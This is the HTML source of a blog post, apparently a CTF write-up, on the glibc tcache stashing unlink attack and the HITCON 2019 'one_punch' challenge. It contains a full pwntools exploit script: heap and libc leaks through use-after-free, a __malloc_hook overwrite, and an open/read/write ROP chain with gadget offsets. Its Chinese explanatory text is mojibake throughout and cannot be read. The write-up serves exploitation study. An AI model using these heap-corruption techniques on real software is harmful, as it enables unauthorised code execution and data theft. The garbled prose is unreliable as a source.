<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch | hhdx's blog</title>
<meta name=keywords content="CTF,how2heap"><meta name=description content="tcache stashing unlink attack
åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget->bkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨_int_mallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†_int_mallocéå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚
å¯ä»¥é€ æˆtarget->bk->fdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚
æœ‰ç‚¹åƒfastbin reverse into tcacheã€‚
variation
åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰
ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk->fdå†™å…¥å¤§æ•°å­—ã€‚"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/how2heap-tcache-stashing-unlink-attack-hitcon2019-one-punch/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/how2heap-tcache-stashing-unlink-attack-hitcon2019-one-punch/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/how2heap-tcache-stashing-unlink-attack-hitcon2019-one-punch/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch"><meta property="og:description" content="tcache stashing unlink attack åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget->bkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨_int_mallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†_int_mallocéå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚
å¯ä»¥é€ æˆtarget->bk->fdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚
æœ‰ç‚¹åƒfastbin reverse into tcacheã€‚
variation åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰
ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk->fdå†™å…¥å¤§æ•°å­—ã€‚"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-31T21:40:45+00:00"><meta property="article:modified_time" content="2020-07-31T21:40:45+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="How2heap"><meta name=twitter:card content="summary"><meta name=twitter:title content="How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch"><meta name=twitter:description content="tcache stashing unlink attack
åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget->bkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨_int_mallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†_int_mallocéå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚
å¯ä»¥é€ æˆtarget->bk->fdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚
æœ‰ç‚¹åƒfastbin reverse into tcacheã€‚
variation
åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰
ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk->fdå†™å…¥å¤§æ•°å­—ã€‚"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch","item":"https://hhdx.xyz/post/how2heap-tcache-stashing-unlink-attack-hitcon2019-one-punch/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch","name":"How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch","description":"tcache stashing unlink attack åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget-\u0026gt;bkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨_int_mallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†_int_mallocéå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚\nå¯ä»¥é€ æˆtarget-\u0026gt;bk-\u0026gt;fdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚\næœ‰ç‚¹åƒfastbin reverse into tcacheã€‚\nvariation åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰\nä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk-\u0026gt;fdå†™å…¥å¤§æ•°å­—ã€‚\n","keywords":["CTF","how2heap"],"articleBody":"tcache stashing unlink attack åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget-\u003ebkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨_int_mallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†_int_mallocéå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚\nå¯ä»¥é€ æˆtarget-\u003ebk-\u003efdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚\næœ‰ç‚¹åƒfastbin reverse into tcacheã€‚\nvariation åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰\nä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk-\u003efdå†™å…¥å¤§æ•°å­—ã€‚\ntips å¯ä»¥ä½¿ç”¨åˆ†å‰²unsorted binçš„æ–¹æ³•ï¼Œå¾—åˆ°å¯¹åº”å¤§å°small binï¼Œä¸å¿…äº‹å…ˆå¡«æ»¡tcacheã€‚\nHitcon2019 one_punch åˆ†æ mainå¼€å§‹å¤„ä½¿ç”¨å…¨å±€å˜é‡å­˜å‚¨äº†heap_base+0x10çš„æŒ‡é’ˆã€‚è¿™é‡Œå®é™…ä¸ŠæŒ‡å‘äº†tcacheçš„ç®¡ç†ç»“æ„tcache_perthread_structï¼Œæ¯ä¸ªarenaå­˜åœ¨è¿™ä¹ˆä¸€ä¸ªã€‚åœ¨tcache_initå‡½æ•°ä¸­ä½¿ç”¨_int_mallocåˆ†é…ï¼Œåœ¨2.29ä¸­å¤§å°ä¸º0x280ã€‚\n1 2 3 4 5 6 7 8 9 ############################ ğŸ‘¼ One Punch Man ğŸ‘¼ ############################ # 1. debut # # 2. rename # # 3. show # # 4. retire # # 5. Exit # ############################ debutï¼šè¯»å–å­—ç¬¦ä¸²åˆ°æ ˆä¸Šï¼Œä½¿ç”¨callocåˆ†é…å¯¹åº”å¤§å°çš„chunkè¿›è¡Œå­˜å‚¨ä¸”å­˜å‚¨é•¿åº¦ã€‚è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»åœ¨0x80åˆ°0x400ä¹‹é—´\nrenameï¼šæ›´æ”¹å­—ç¬¦ä¸²\nshowï¼šæ‰“å°å­—ç¬¦ä¸²\nretire ï¼šé‡Šæ”¾ç©ºé—´ï¼Œä½†æ²¡æœ‰å°†æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨æŒ‡é’ˆæ‚¬ç©º\nåŒæ—¶å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œè¾“å…¥0xC388ï¼Œå¯ä»¥æ‰§è¡Œã€‚åé—¨å‡½æ•°åˆ¤æ–­heap_base+0x30å¤„çš„å•å­—èŠ‚æ˜¯å¦å¤§äº6ï¼Œå¤§äºåˆ™ç»§ç»­æ‰§è¡Œã€‚ä½¿ç”¨mallocåˆ†é…0x217ï¼Œç„¶åè¯»å…¥å­—ç¬¦ä¸²ã€‚æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œè¿™é‡Œå­˜åœ¨å†…å­˜æ³„æ¼\ncalloc\nmallocæ‰§è¡Œè¿‡ç¨‹ï¼š__libc_malloc-\u003e_int_malloc\ncallocæ‰§è¡Œè¿‡ç¨‹ï¼š__libc_calloc-\u003e_int_malloc\nä½¿ç”¨tcacheåˆ†é…å³ä¸ºtcache_getå­˜åœ¨äº__libc_mallocï¼Œè€Œ_int_mallocåªä¼šä½¿ç”¨tcache_putå¡«å……tcacheã€‚æ‰€ä»¥å¾—å‡ºä¸€èˆ¬ç»“è®ºï¼Œcallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ã€‚\nï¼ˆæœ‰ä¾‹å¤–ï¼Œåœ¨_int_mallocä¸­éå†unsorted binçš„å°¾éƒ¨å­˜åœ¨ä½¿ç”¨tcacheåˆ†é…çš„è¡Œä¸ºï¼‰\næ€»ä½“æ€è·¯ åˆ©ç”¨UAFæ³„éœ²heap baseã€libc baseã€‚\nåˆ©ç”¨tcache stashing unlink attackè¦†å†™heap_base+0x30çš„ä½ç½®ã€‚è§£é™¤åé—¨å‡½æ•°çš„ä½¿ç”¨é™åˆ¶ã€‚\nå¯¹0x220ï¼ˆå³malloc(0x217)ä½¿ç”¨ï¼‰çš„tcacheä½¿ç”¨ç±»ä¼¼fastbin attackçš„æ–¹å¼ä¿®æ”¹__malloc_hookã€‚å› ä¸ºç¨‹åºä½¿ç”¨äº†seccompé™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åç»­ä½¿ç”¨ropçš„æ–¹å¼è¯»å‡ºflagã€‚__malloc_hookä¿®æ”¹ä¸ºadd rsp, 0x48; retçš„gadgetåœ°å€ï¼Œå°†rspç§»åŠ¨åˆ°debutå‡½æ•°çš„bufä½ç½®ã€‚åˆ©ç”¨debutä¸­çš„read(0, buf, 0x400)å°†ä¸€ç³»åˆ—ropæ“ä½œè¯»å…¥åˆ°bufé‡Œã€‚\ntcache stashing unlink attack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 for i in range(6): debut(0, b\"A\"*0xf8) retire(0) for i in range(7): debut(0, b\"A\"*0x400) retire(0) # gdb.attach(io, \"b *$rebase(0x16AB)\") debut(0, b\"A\"*0x400) debut(1, b\"A\"*0x400) retire(0) debut(0, b\"A\"*0x300) debut(0, b\"A\"*0x400) debut(1, b\"A\"*0x400) retire(0) debut(1, b\"A\"*0x300) debut(1, b\"A\"*0x200) rename(0, b\"A\"*0x308 + p64(0x101) + p64(heap_base+0x2d20) + p64(heap_base+0x1f)) debut(0, b\"./flag\".ljust(0xf8, b\"\\x00\"))\t# trigger ç›®æ ‡æ˜¯0x100ï¼Œé¦–å…ˆé‡Šæ”¾6ä¸ªè¿›tcacheã€‚ç„¶åé€šè¿‡åˆ‡å‰²unsorted binçš„æ–¹å¼ï¼Œä½¿ä¸¤ä¸ª0x100çš„chunkè¿›å…¥small binã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall binçš„bkï¼Œå°†å…¶æŒ‡å‘heap_base+0x30-0x11å¤„ã€‚\nå¦‚æœæŒ‡å‘heap_base+0x30-0x10ï¼Œåˆ™ä¼šå°†0x90å†™å…¥heap_base+0x30å¤„ï¼Œcmp al, 6çœ‹èµ·æ¥æ˜¯æœ‰ç¬¦å·æ¯”è¾ƒï¼Œä¼šè®¤ä¸º0x90å°äº0x6ã€‚æ‰€ä»¥åç§»ä¸€ä¸ªå­—èŠ‚ï¼Œä½†æœ‰æ—¶è¿˜æ˜¯ä¼šå› ä¸ºæœ€é«˜ä½ä¸º1è€Œggã€‚\ntcache attack 1 2 3 4 5 6 7 8 debut(0, b\"A\"*0x217) debut(1, b\"A\"*0x217) retire(0) retire(1) rename(1, p64(libc_base+libc.sym[\"__malloc_hook\"])) backdoor(\"A\") backdoor(p64(libc_base+0xbdfd1)) é‡Šæ”¾å¾—åˆ°ä¸¤ä¸ª0x220çš„å—è¿›å…¥tcacheï¼Œä¿®æ”¹ç¬¬ä¸€ä¸ªçš„tcache_entry-\u003enextåˆ°__malloc_hookã€‚ä¸¤æ¬¡åˆ†é…è·å¾—hookï¼Œä¿®æ”¹ä¸ºadd rsp, 0x48; retçš„gadgetåœ°å€ã€‚ä¸ºä»€ä¹ˆæ˜¯0x48ï¼Œè°ƒè¯•å¯ä»¥çŸ¥é“ã€‚\nrop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # rop poprdi = libc_base + 0x219c0 poprsi = libc_base + 0x24435 poprdx = libc_base + 0x1b9a poprax = libc_base + 0x37fa8 syscall= libc_base + g(\"syscall; ret\") ## open rops = p64(poprdi) + p64(heap_base+0x2d30) rops += p64(poprsi) + p64(0) rops += p64(poprdx) + p64(0) rops += p64(poprax) + p64(2) rops += p64(syscall) ## read rops += p64(poprdi) + p64(3) rops += p64(poprsi) + p64(heap_base+0x2d30) rops += p64(poprdx) + p64(20) rops += p64(poprax) + p64(0) rops += p64(syscall) ## write rops += p64(poprdi) + p64(1) rops += p64(poprsi) + p64(heap_base+0x2d30) rops += p64(poprdx) + p64(20) rops += p64(poprax) + p64(1) rops += p64(syscall) ä¾æ¬¡ä½¿ç”¨openã€readã€writeç³»ç»Ÿè°ƒç”¨ï¼Œè¯»å–flagã€‚å…¶ä¸­syscall; retè¿™ä¸ªgadgetï¼ŒROPgadgetè¿™ä¸ªå·¥å…·ä¸ä¼šè¿›è¡Œç”Ÿæˆï¼Œä½¿ç”¨äº†æœºå™¨ç æœç´¢çš„æ–¹å¼g = lambda x :next(libc.search(asm(x)))ã€‚\nexploit exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 #!/usr/bin/env python3 from pwn import * context(os=\"linux\", arch=\"amd64\", log_level=\"info\") localfile = \"./one_punch\" locallibc = \"../glibc_versions/2.29/x64_tcache/lib/libc.so.6\" pf = lambda name,num :log.info(name + \": 0x%x\" % num) g = lambda x :next(libc.search(asm(x))) def debut(idx, name): io.recvuntil(\"\u003e \") io.sendline(\"1\") io.recvuntil(\"idx: \") io.sendline(str(idx)) io.recvuntil(\"hero name: \") io.send(name) def rename(idx, name): io.recvuntil(\"\u003e \") io.sendline(\"2\") io.recvuntil(\"idx: \") io.sendline(str(idx)) io.recvuntil(\"hero name: \") io.send(name) def show(idx): io.recvuntil(\"\u003e \") io.sendline(\"3\") io.recvuntil(\"idx: \") io.sendline(str(idx)) def retire(idx): io.recvuntil(\"\u003e \") io.sendline(\"4\") io.recvuntil(\"idx: \") io.sendline(str(idx)) def backdoor(s): io.recvuntil(\"\u003e \") io.sendline(str(0xc388)) sleep(0.1) io.send(s) def exp(): for i in range(6): debut(0, b\"A\"*0x80) retire(0) # leak heap base debut(0, b\"A\"*0x80) retire(0) show(0) io.recvuntil(\"hero name: \") heap_base = u64(io.recvline().strip(b\"\\n\").ljust(8, b\"\\x00\")) \u0026 (~0xfff) pf(\"heap base\", heap_base) # leak libc base debut(0, b\"A\"*0x80) debut(1, b\"A\"*0x80) retire(0) show(0) io.recvuntil(\"hero name: \") libc_base = u64(io.recvline().strip(b\"\\n\").ljust(8, b\"\\x00\")) - 0x3B3CA0 pf(\"libc base\", libc_base) # tcache stashing unlink attack for i in range(6): debut(0, b\"A\"*0xf8) retire(0) for i in range(7): debut(0, b\"A\"*0x400) retire(0) # gdb.attach(io, \"b *$rebase(0x16AB)\") debut(0, b\"A\"*0x400) debut(1, b\"A\"*0x400) retire(0) debut(0, b\"A\"*0x300) debut(0, b\"A\"*0x400) debut(1, b\"A\"*0x400) retire(0) debut(1, b\"A\"*0x300) debut(1, b\"A\"*0x200) rename(0, b\"A\"*0x308 + p64(0x101) + p64(heap_base+0x2d20) + p64(heap_base+0x1f)) debut(0, b\"./flag\".ljust(0xf8, b\"\\x00\")) # debut(0, b\"A\"*0x217) debut(1, b\"A\"*0x217) retire(0) retire(1) rename(1, p64(libc_base+libc.sym[\"__malloc_hook\"])) backdoor(\"A\") backdoor(p64(libc_base+0xbdfd1)) # rop poprdi = libc_base + 0x219c0 poprsi = libc_base + 0x24435 poprdx = libc_base + 0x1b9a poprax = libc_base + 0x37fa8 syscall= libc_base + g(\"syscall; ret\") ## open rops = p64(poprdi) + p64(heap_base+0x2d30) rops += p64(poprsi) + p64(0) rops += p64(poprdx) + p64(0) rops += p64(poprax) + p64(2) rops += p64(syscall) ## read rops += p64(poprdi) + p64(3) rops += p64(poprsi) + p64(heap_base+0x2d30) rops += p64(poprdx) + p64(20) rops += p64(poprax) + p64(0) rops += p64(syscall) ## write rops += p64(poprdi) + p64(1) rops += p64(poprsi) + p64(heap_base+0x2d30) rops += p64(poprdx) + p64(20) rops += p64(poprax) + p64(1) rops += p64(syscall) # gdb.attach(io, \"\"\"b *$rebase(0x16AB) # b *$rebase(0x139C) # \"\"\") debut(0, rops.ljust(0x80, b\"\\x00\")) io.interactive(1) argc = len(sys.argv) if argc == 1: io = process(localfile) else: if argc == 2: host, port = sys.argv[1].split(\":\") elif argc == 3: host = sys.argv[1] port = sys.argv[2] io = remote(host, port) elf = ELF(localfile) libc = ELF(locallibc) exp() \"\"\" 0x00000000000bdfd1 : add rsp, 0x48 ; ret 0x00000000000219c0 : pop rdi ; ret 0x0000000000024435 : pop rsi ; ret 0x0000000000001b9a : pop rdx ; ret 0x0000000000037fa8 : pop rax ; ret 0x000000000000275b : syscall \"\"\" reference how2heap tcache_stashing_unlink_attack.c https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus ","wordCount":"2564","inLanguage":"zh-cn","datePublished":"2020-07-31T21:40:45Z","dateModified":"2020-07-31T21:40:45Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/how2heap-tcache-stashing-unlink-attack-hitcon2019-one-punch/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=ä¸»é¡µ><span>ä¸»é¡µ</span></a></li><li><a href=https://hhdx.xyz/post/ title=å½’æ¡£><span>å½’æ¡£</span></a></li><li><a href=https://hhdx.xyz/tags/ title=æ ‡ç­¾><span>æ ‡ç­¾</span></a></li><li><a href=https://hhdx.xyz/underway/ title=æ–½å·¥ä¸­><span>æ–½å·¥ä¸­</span></a></li><li><a href=https://hhdx.xyz/about/ title=å…³äº><span>å…³äº</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch</h1><div class=post-meta><span title='2020-07-31 21:40:45 +0000 UTC'>July 31, 2020</span>&nbsp;Â·&nbsp;hhdx</div></header><div class=post-content><h2 id=tcache-stashing-unlink-attack>tcache stashing unlink attack<a hidden class=anchor aria-hidden=true href=#tcache-stashing-unlink-attack>#</a></h2><p>åœ¨tcacheä¸­å¸ƒç½®5ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkæŒ‡å‘targetï¼Œtarget->bkå†™å…¥ä¸€ä¸ªå¯å†™çš„ä½ç½®ã€‚ä½¿ç”¨callocè§¦å‘ï¼Œå› ä¸ºcallocè°ƒç”¨<code>_int_malloc</code>ä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ï¼ˆé™¤äº†<code>_int_malloc</code>éå†unsorted binçš„å°¾éƒ¨ï¼‰ï¼Œåªä¼šå¾€tcacheä¸­å¡«å……ã€‚</p><p>å¯ä»¥é€ æˆtarget->bk->fdä½ç½®å†™å…¥å¤§æ•°å­—ï¼Œå¹¶ä¸”targetæˆä¸ºtcacheä¸­ç¬¬ä¸€ä¸ªï¼Œå†æ¬¡mallocå°±å¯ä»¥è·å¾—ã€‚</p><p>æœ‰ç‚¹åƒfastbin reverse into tcacheã€‚</p><h3 id=variation>variation<a hidden class=anchor aria-hidden=true href=#variation>#</a></h3><p>åœ¨tcacheä¸­å¸ƒç½®6ä¸ªchunkï¼Œå¯¹åº”å¤§å°çš„small binä¸­å¸ƒç½®2ä¸ªchunkã€‚ï¼ˆå¯ä»¥ç”¨unsorted binåˆ‡å‰²çš„æ–¹å¼å¸ƒç½®2ä¸ªsmall binï¼‰</p><p>ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall chunkçš„bkï¼Œcallocè§¦å‘ï¼Œåªåœ¨bk->fdå†™å…¥å¤§æ•°å­—ã€‚</p><h3 id=tips>tips<a hidden class=anchor aria-hidden=true href=#tips>#</a></h3><p>å¯ä»¥ä½¿ç”¨åˆ†å‰²unsorted binçš„æ–¹æ³•ï¼Œå¾—åˆ°å¯¹åº”å¤§å°small binï¼Œä¸å¿…äº‹å…ˆå¡«æ»¡tcacheã€‚</p><h2 id=hitcon2019-one_punch>Hitcon2019 one_punch<a hidden class=anchor aria-hidden=true href=#hitcon2019-one_punch>#</a></h2><h3 id=åˆ†æ>åˆ†æ<a hidden class=anchor aria-hidden=true href=#åˆ†æ>#</a></h3><p>mainå¼€å§‹å¤„ä½¿ç”¨å…¨å±€å˜é‡å­˜å‚¨äº†heap_base+0x10çš„æŒ‡é’ˆã€‚è¿™é‡Œå®é™…ä¸ŠæŒ‡å‘äº†tcacheçš„ç®¡ç†ç»“æ„<code>tcache_perthread_struct</code>ï¼Œæ¯ä¸ªarenaå­˜åœ¨è¿™ä¹ˆä¸€ä¸ªã€‚åœ¨<code>tcache_init</code>å‡½æ•°ä¸­ä½¿ç”¨<code>_int_malloc</code>åˆ†é…ï¼Œåœ¨2.29ä¸­å¤§å°ä¸º0x280ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>############################
